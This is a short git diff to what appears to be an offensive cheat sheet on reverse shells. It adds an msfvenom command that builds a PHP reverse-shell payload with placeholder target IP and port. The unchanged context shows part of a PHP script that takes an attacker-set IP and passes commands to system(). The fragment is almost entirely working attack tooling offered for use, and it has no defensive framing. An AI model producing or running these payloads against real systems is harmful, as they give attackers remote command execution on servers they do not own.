@@ -1,7 +1,9 @@
 Windows : 
 
-```
-
+msfvenom :
+-----------------------------------------------------------
+msfvenom -p php/reverse_php LHOST=targetip LPORT=targetport -f raw -o poc.php
+-----------------------------------------------------------
 <?php
 header('Content-type: text/plain');
 $ip   = "targetip"; //change this 
@@ -22,7 +24,6 @@ $res .= "\n\nExecuting : ".$cmd."\n";
 echo $res;
 $output = system($cmd);	            
 ?>
-
-```
+---------------------------------------------------------
 
 Linux : 
